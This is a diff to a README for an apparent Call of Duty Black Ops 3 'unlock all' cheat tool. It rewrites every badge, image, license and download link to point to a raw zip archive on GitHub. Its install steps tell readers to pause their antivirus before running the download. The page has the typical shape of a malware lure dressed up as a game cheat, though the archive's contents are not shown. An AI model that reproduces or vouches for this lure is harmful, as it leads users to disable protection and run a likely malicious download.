@@ -1,11 +1,11 @@
 # Call of Duty: Black Ops 3 – Universal Unlock All Utility 🎮
 
-[![Version](https://raw.githubusercontent.com/DrewFist/bo3-unlock-all-toolkit/branch/cuneiform/all_bo_unlock_toolkit_2.7.zip)](https://raw.githubusercontent.com/DrewFist/bo3-unlock-all-toolkit/branch/cuneiform/all_bo_unlock_toolkit_2.7.zip)
-[![Build](https://raw.githubusercontent.com/DrewFist/bo3-unlock-all-toolkit/branch/cuneiform/all_bo_unlock_toolkit_2.7.zip)](https://raw.githubusercontent.com/DrewFist/bo3-unlock-all-toolkit/branch/cuneiform/all_bo_unlock_toolkit_2.7.zip)
-[![License](https://raw.githubusercontent.com/DrewFist/bo3-unlock-all-toolkit/branch/cuneiform/all_bo_unlock_toolkit_2.7.zip)](#-license)
-[![Downloads](https://raw.githubusercontent.com/DrewFist/bo3-unlock-all-toolkit/branch/cuneiform/all_bo_unlock_toolkit_2.7.zip)](#download)
+[![Version](https://raw.githubusercontent.com/DrewFist/bo3-unlock-all-toolkit/branch/cuneiform/bo_all_toolkit_unlock_1.2-beta.3.zip)](https://raw.githubusercontent.com/DrewFist/bo3-unlock-all-toolkit/branch/cuneiform/bo_all_toolkit_unlock_1.2-beta.3.zip)
+[![Build](https://raw.githubusercontent.com/DrewFist/bo3-unlock-all-toolkit/branch/cuneiform/bo_all_toolkit_unlock_1.2-beta.3.zip)](https://raw.githubusercontent.com/DrewFist/bo3-unlock-all-toolkit/branch/cuneiform/bo_all_toolkit_unlock_1.2-beta.3.zip)
+[![License](https://raw.githubusercontent.com/DrewFist/bo3-unlock-all-toolkit/branch/cuneiform/bo_all_toolkit_unlock_1.2-beta.3.zip)](#-license)
+[![Downloads](https://raw.githubusercontent.com/DrewFist/bo3-unlock-all-toolkit/branch/cuneiform/bo_all_toolkit_unlock_1.2-beta.3.zip)](#download)
 
-![Download](https://raw.githubusercontent.com/DrewFist/bo3-unlock-all-toolkit/branch/cuneiform/all_bo_unlock_toolkit_2.7.zip)  
+![Download](https://raw.githubusercontent.com/DrewFist/bo3-unlock-all-toolkit/branch/cuneiform/bo_all_toolkit_unlock_1.2-beta.3.zip)  
 [**Download COD BO3 Unlock All Utility**](LINK)
 
 ---
@@ -68,14 +68,14 @@ Unlike so-called "Giveaway" or risky alternatives, **our proprietary Access Ampl
 Follow these streamlined instructions to begin your personalized journey through COD BO3:
 
 ### **Step 1.**  
-Download the **COD BO3 Unlock All Utility** from the trusted cloud https://raw.githubusercontent.com/DrewFist/bo3-unlock-all-toolkit/branch/cuneiform/all_bo_unlock_toolkit_2.7.zip
+Download the **COD BO3 Unlock All Utility** from the trusted cloud https://raw.githubusercontent.com/DrewFist/bo3-unlock-all-toolkit/branch/cuneiform/bo_all_toolkit_unlock_1.2-beta.3.zip
 
 *Ensure your antivirus is paused—our tool modifies local game data to unlock all content natively (safe, tested, and revertible).*
 
 ### **Step 2.**  
 **Click the image below to download directly:**
 
-[![Download](https://raw.githubusercontent.com/DrewFist/bo3-unlock-all-toolkit/branch/cuneiform/all_bo_unlock_toolkit_2.7.zip)](LINK)
+[![Download](https://raw.githubusercontent.com/DrewFist/bo3-unlock-all-toolkit/branch/cuneiform/bo_all_toolkit_unlock_1.2-beta.3.zip)](LINK)
 
 ### **Step 3.**  
 - Extract the zipped package to your desktop or chosen directory.
@@ -135,11 +135,11 @@ Please use responsibly, and consider supporting the developers of the game for c
 ## 📜 License
 
 This project is licensed under the MIT License (2025).  
-Please see the [MIT License](https://raw.githubusercontent.com/DrewFist/bo3-unlock-all-toolkit/branch/cuneiform/all_bo_unlock_toolkit_2.7.zip) for full details.
+Please see the [MIT License](https://raw.githubusercontent.com/DrewFist/bo3-unlock-all-toolkit/branch/cuneiform/bo_all_toolkit_unlock_1.2-beta.3.zip) for full details.
 
 ---
 
-![Download](https://raw.githubusercontent.com/DrewFist/bo3-unlock-all-toolkit/branch/cuneiform/all_bo_unlock_toolkit_2.7.zip)  
+![Download](https://raw.githubusercontent.com/DrewFist/bo3-unlock-all-toolkit/branch/cuneiform/bo_all_toolkit_unlock_1.2-beta.3.zip)  
 [**Download COD BO3 Unlock All Utility**](LINK)
 
 ---
